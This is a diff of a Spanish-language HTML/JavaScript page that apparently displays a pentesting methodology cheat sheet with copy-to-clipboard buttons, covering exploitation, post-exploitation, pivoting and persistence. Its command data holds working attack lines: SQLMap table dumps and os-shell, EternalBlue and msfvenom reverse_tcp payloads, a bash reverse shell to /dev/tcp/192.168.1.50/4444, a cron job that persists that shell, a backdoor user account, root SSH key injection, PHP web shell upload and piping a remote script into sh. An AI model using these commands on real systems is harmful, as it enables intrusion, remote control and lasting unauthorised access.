         ]
       },
       {
-        phase: "Explotación Web",
-        description: "Explotar vulnerabilidades encontradas en aplicaciones web.",
+        name: "Explotación",
+        description: "Explotar vulnerabilidades encontradas",
         tools: [
           {
             name: "SQLMap",
             commands: [
-              { label: "Detectar SQLi", cmd: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --batch", desc: "Detecta inyección SQL automáticamente" },
-              { label: "Listar bases de datos", cmd: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --dbs", desc: "Enumera todas las bases de datos" },
-              { label: "Dumpear tabla", cmd: "sqlmap -u 'http://10.10.10.100/page.php?id=1' -D database -T users --dump", desc: "Extrae contenido de tabla específica" },
-              { label: "OS Shell", cmd: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --os-shell", desc: "Intenta obtener shell del sistema operativo" },
-              { label: "POST request", cmd: "sqlmap -u 'http://10.10.10.100/login.php' --data='username=admin&password=test' -p username", desc: "SQLi en parámetros POST" }
+              { label: "Detectar SQLi", cmd: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --batch" },
+              { label: "Listar DBs", cmd: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --dbs" },
+              { label: "Dumpear tabla", cmd: "sqlmap -u 'http://10.10.10.100/page.php?id=1' -D database -T users --dump" },
+              { label: "OS Shell", cmd: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --os-shell" }
             ]
           },
           {
-            name: "XSS & File Upload",
-            commands: [
-              { label: "XSS básico", cmd: 'curl "http://dominio.com/page.php?name=<script>alert(1)</script>"', desc: "Prueba XSS reflejado simple" },
-              { label: "Upload PHP shell", cmd: "curl -F 'file=@shell.php' http://dominio.com/upload.php", desc: "Sube web shell PHP" },
-              { label: "Bypass extensión", cmd: "mv shell.php shell.php.jpg && curl -F 'file=@shell.php.jpg' http://dominio.com/upload.php", desc: "Intenta bypass de validación de extensión" }
-            ]
-          }
-        ]
-      },
-      {
-        phase: "Explotación con Metasploit",
-        description: "Usar Metasploit Framework para explotar servicios vulnerables.",
-        tools: [
-          {
             name: "Metasploit",
             commands: [
-              { label: "Iniciar MSF", cmd: "msfconsole", desc: "Inicia Metasploit Framework" },
-              { label: "Buscar exploit", cmd: "search eternalblue", desc: "Busca exploits disponibles" },
-              { label: "EternalBlue", cmd: "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nset LHOST 192.168.1.50\nexploit", desc: "Explota vulnerabilidad EternalBlue en SMB" },
-              { label: "Reverse TCP handler", cmd: "use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.50\nexploit", desc: "Listener para recibir conexiones inversas" },
-              { label: "msfvenom payload", cmd: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > shell.exe", desc: "Genera payload ejecutable de Windows" }
+              { label: "Iniciar", cmd: "msfconsole" },
+              { label: "Buscar", cmd: "search eternalblue" },
+              { label: "EternalBlue", cmd: "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nset LHOST 192.168.1.50\nexploit" },
+              { label: "msfvenom", cmd: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > shell.exe" }
             ]
           },
           {
             name: "Searchsploit",
             commands: [
-              { label: "Buscar exploit", cmd: "searchsploit apache 2.4.49", desc: "Busca exploits para software específico" },
-              { label: "Ver código", cmd: "searchsploit -x 49584", desc: "Muestra el código del exploit" },
-              { label: "Copiar exploit", cmd: "searchsploit -m 49584", desc: "Copia exploit al directorio actual" },
-              { label: "Actualizar DB", cmd: "searchsploit -u", desc: "Actualiza base de datos de exploits" }
+              { label: "Buscar", cmd: "searchsploit apache 2.4.49" },
+              { label: "Ver codigo", cmd: "searchsploit -x 49584" },
+              { label: "Copiar", cmd: "searchsploit -m 49584" }
             ]
           }
         ]
       },
       {
-        phase: "Post-Explotación",
-        description: "Mantener acceso, elevar privilegios y moverse lateralmente en la red.",
+        name: "Post-Explotación",
+        description: "Escalación, pivoting y persistencia",
         tools: [
           {
-            name: "Netcat & Shells",
+            name: "Shells",
             commands: [
-              { label: "Listener", cmd: "nc -lvnp 4444", desc: "Listener para recibir reverse shell" },
-              { label: "Reverse shell bash", cmd: "bash -i >& /dev/tcp/192.168.1.50/4444 0>&1", desc: "Reverse shell usando bash (ejecutar en víctima)" },
-              { label: "Python TTY", cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", desc: "Mejora shell a TTY interactivo" },
-              { label: "Transferir archivo", cmd: "# Receptor: nc -lvnp 4444 > file.txt\n# Emisor: nc 192.168.1.100 4444 < file.txt", desc: "Transfiere archivos entre máquinas" }
+              { label: "Listener", cmd: "nc -lvnp 4444" },
+              { label: "Reverse bash", cmd: "bash -i >& /dev/tcp/192.168.1.50/4444 0>&1" },
+              { label: "Python TTY", cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'" },
+              { label: "Transferir archivo", cmd: "nc -lvnp 4444 > file.txt" }
             ]
           },
           {
-            name: "Escalación de Privilegios",
+            name: "Escalación",
             commands: [
-              { label: "SUID binarios", cmd: "find / -perm -4000 2>/dev/null", desc: "Busca binarios con bit SUID (potencial privesc)" },
-              { label: "Sudo permisos", cmd: "sudo -l", desc: "Lista comandos que el usuario puede ejecutar con sudo" },
-              { label: "LinPEAS", cmd: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", desc: "Script automático de enumeración para Linux" },
-              { label: "Capabilities", cmd: "getcap -r / 2>/dev/null", desc: "Lista capabilities de archivos (puede permitir privesc)" }
+              { label: "SUID binarios", cmd: "find / -perm -4000 2>/dev/null" },
+              { label: "Sudo permisos", cmd: "sudo -l" },
+              { label: "LinPEAS", cmd: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" },
+              { label: "Capabilities", cmd: "getcap -r / 2>/dev/null" }
             ]
           },
           {
-            name: "Pivoting & Port Forwarding",
+            name: "Pivoting",
             commands: [
-              { label: "SSH Local Forward", cmd: "ssh -L 8080:localhost:80 user@192.168.1.100", desc: "Redirige puerto local 8080 al puerto 80 del servidor remoto" },
-              { label: "SSH Remote Forward", cmd: "ssh -R 8080:localhost:80 user@192.168.1.100", desc: "Expone puerto local 80 en el puerto 8080 del servidor remoto" },
-              { label: "SSH Dynamic (SOCKS)", cmd: "ssh -D 9050 user@192.168.1.100", desc: "Crea proxy SOCKS en puerto 9050 para tunelizar tráfico" },
-              { label: "ProxyChains", cmd: "# Editar /etc/proxychains.conf: socks5 127.0.0.1 9050\nproxychains nmap -sT 10.10.10.0/24", desc: "Usa proxy SOCKS para escanear red interna" },
-              { label: "Chisel Server", cmd: "chisel server -p 8080 --reverse", desc: "Inicia servidor Chisel para tunneling" },
-              { label: "Chisel Client", cmd: "chisel client 192.168.1.50:8080 R:8001:localhost:8001", desc: "Cliente Chisel que redirige puertos" },
-              { label: "SSHuttle VPN", cmd: "sshuttle -r user@192.168.1.100 10.10.10.0/24", desc: "Crea VPN sobre SSH para acceder a red interna completa" }
+              { label: "SSH Local Forward", cmd: "ssh -L 8080:localhost:80 user@192.168.1.100" },
+              { label: "SSH Remote Forward", cmd: "ssh -R 8080:localhost:80 user@192.168.1.100" },
+              { label: "SSH SOCKS", cmd: "ssh -D 9050 user@192.168.1.100" },
+              { label: "ProxyChains", cmd: "proxychains nmap -sT 10.10.10.0/24" },
+              { label: "SSHuttle VPN", cmd: "sshuttle -r user@192.168.1.100 10.10.10.0/24" }
             ]
           },
           {
             name: "Persistencia",
             commands: [
-              { label: "Cron job", cmd: "echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/192.168.1.50/4444 0>&1\"' | crontab -", desc: "Añade reverse shell a crontab para ejecución periódica" },
-              { label: "SSH Key", cmd: "ssh-keygen -t rsa\ncat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys", desc: "Añade tu clave SSH para acceso persistente" },
-              { label: "Backdoor usuario", cmd: "useradd -m -s /bin/bash backdoor && echo 'backdoor:password123' | chpasswd", desc: "Crea usuario backdoor con contraseña" }
+              { label: "Cron job", cmd: "echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/192.168.1.50/4444 0>&1\"' | crontab -" },
+              { label: "SSH Key", cmd: "cat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys" },
+              { label: "Backdoor user", cmd: "useradd -m -s /bin/bash backdoor && echo 'backdoor:password123' | chpasswd" }
             ]
           }
         ]
       }
     ];
 
-    const roadmap = document.getElementById('roadmap');
+    const roadmapDiv = document.getElementById('roadmap');
 
-    methodology.forEach((phase, idx) => {
+    phases.forEach((phase, phaseIdx) => {
       const phaseDiv = document.createElement('div');
-      phaseDiv.className = 'phase';
+      phaseDiv.className = 'phase closed';
 
-      const header = document.createElement('div');
-      header.className = 'phase-header';
-      header.innerHTML = `
-        <div class="phase-number">${idx + 1}</div>
-        <div class="phase-title">${phase.phase}</div>
-        <div class="phase-toggle">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-            <path d="M6 9l6 6 6-6"/>
-          </svg>
+      const phaseHeader = document.createElement('div');
+      phaseHeader.className = 'phase-header';
+      phaseHeader.innerHTML = `
+        <div class="phase-title-group">
+          <div class="phase-number">${phaseIdx + 1}</div>
+          <div>
+            <div class="phase-title">${phase.name}</div>
+            <div class="phase-description">${phase.description}</div>
+          </div>
         </div>
+        <div class="toggle-icon">▶</div>
       `;
 
-      header.addEventListener('click', () => {
+      phaseHeader.addEventListener('click', function() {
         phaseDiv.classList.toggle('open');
+        phaseDiv.classList.toggle('closed');
       });
 
-      const desc = document.createElement('div');
-      desc.className = 'phase-desc';
-      desc.textContent = phase.description;
+      phaseDiv.appendChild(phaseHeader);
+
+      const phaseContent = document.createElement('div');
+      phaseContent.className = 'phase-content';
 
       const toolsGrid = document.createElement('div');
       toolsGrid.className = 'tools-grid';
 
       phase.tools.forEach(tool => {
-        const toolCard = document.createElement('div');
-        toolCard.className = 'tool-card';
+        const toolDiv = document.createElement('div');
+        toolDiv.className = 'tool tool-closed';
 
-        toolCard.innerHTML = `
-          <div class="tool-header">
-            <div class="tool-icon">
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                <path d="M10 2h4v2h-4zM3 8h18v2H3zM7 13h10v2H7zM11 18h2v2h-2z"/>
-              </svg>
-            </div>
-            <div class="tool-name">${tool.name}</div>
-          </div>
+        const toolHeader = document.createElement('div');
+        toolHeader.className = 'tool-header';
+        toolHeader.innerHTML = `
+          <span class="tool-name">${tool.name}</span>
+          <span class="tool-toggle">▶</span>
         `;
+
+        toolHeader.addEventListener('click', function() {
+          toolDiv.classList.toggle('tool-open');
+          toolDiv.classList.toggle('tool-closed');
+        });
+
+        toolDiv.appendChild(toolHeader);
 
         const commandsDiv = document.createElement('div');
         commandsDiv.className = 'commands';
 
         tool.commands.forEach(cmd => {
           const cmdBlock = document.createElement('div');
-          cmdBlock.className = 'cmd-block';
-          cmdBlock.innerHTML = `
-            <div class="cmd-header">
-              <div class="cmd-label">${cmd.label}</div>
-              <button class="copy-btn" data-cmd="${escapeHtml(cmd.cmd)}">COPIAR</button>
-            </div>
-            <div class="cmd-code">${formatCommand(cmd.cmd)}</div>
-            <div class="cmd-expl">
-              <span>💡</span>
-              <div>${cmd.desc}</div>
-            </div>
+          cmdBlock.className = 'command-block';
+
+          const cmdHeader = document.createElement('div');
+          cmdHeader.className = 'cmd-header';
+          cmdHeader.innerHTML = `
+            <span class="cmd-label">${cmd.label}</span>
+            <button class="copy-btn" onclick="copiarComando(this)">COPIAR</button>
           `;
+
+          const cmdCode = document.createElement('div');
+          cmdCode.className = 'cmd-code';
+          cmdCode.textContent = cmd.cmd;
+          cmdCode.style.display = 'none';
+
+          const cmdExpl = document.createElement('div');
+          cmdExpl.className = 'cmd-expl';
+          cmdExpl.textContent = '✓ ' + (cmd.desc || cmd.label);
+
+          cmdBlock.appendChild(cmdHeader);
+          cmdBlock.appendChild(cmdCode);
+          cmdBlock.appendChild(cmdExpl);
+
+          cmdBlock.firstChild.addEventListener('click', function() {
+            const codeDiv = cmdBlock.querySelector('.cmd-code');
+            codeDiv.style.display = codeDiv.style.display === 'none' ? 'block' : 'none';
+          });
+
+          cmdBlock.style.cursor = 'pointer';
+
           commandsDiv.appendChild(cmdBlock);
         });
 
-        toolCard.appendChild(commandsDiv);
-        toolCard.addEventListener('click', (e) => {
-          if (!e.target.classList.contains('copy-btn')) {
-            toolCard.classList.toggle('expanded');
-          }
-        });
-
-        toolsGrid.appendChild(toolCard);
+        toolDiv.appendChild(commandsDiv);
+        toolsGrid.appendChild(toolDiv);
       });
 
-      phaseDiv.appendChild(header);
-      phaseDiv.appendChild(desc);
-      phaseDiv.appendChild(toolsGrid);
-      roadmap.appendChild(phaseDiv);
+      phaseContent.appendChild(toolsGrid);
+      phaseDiv.appendChild(phaseContent);
+
+      roadmapDiv.appendChild(phaseDiv);
     });
 
-    // Copy functionality
-    document.addEventListener('click', (e) => {
-      if (e.target.classList.contains('copy-btn')) {
-        const cmd = e.target.getAttribute('data-cmd');
-        navigator.clipboard.writeText(cmd).then(() => {
-          const original = e.target.textContent;
-          e.target.textContent = 'COPIADO!';
-          e.target.classList.add('copied');
-          setTimeout(() => {
-            e.target.textContent = original;
-            e.target.classList.remove('copied');
-          }, 2000);
-        });
-      }
-    });
+    function copiarComando(btn) {
+      const cmdBlock = btn.closest('.command-block');
+      const cmdCode = cmdBlock.querySelector('.cmd-code');
+      const texto = cmdCode.textContent.trim();
 
-    function escapeHtml(text) {
-      const div = document.createElement('div');
-      div.textContent = text;
-      return div.innerHTML;
-    }
+      navigator.clipboard.writeText(texto).then(() => {
+        const originalText = btn.textContent;
+        btn.textContent = '✓ COPIADO';
+        btn.classList.add('copied');
 
-    function formatCommand(cmd) {
-      return cmd.split('\n').map(line => {
-        if (line.trim().startsWith('#')) {
-          return `<div class="comment">${escapeHtml(line)}</div>`;
-        }
-        return `<div>${escapeHtml(line)}</div>`;
-      }).join('');
+        setTimeout(() => {
+          btn.textContent = originalText;
+          btn.classList.remove('copied');
+        }, 2000);
+      }).catch(() => {
+        alert('Error al copiar');
+      });
     }
   </script>
 </body>
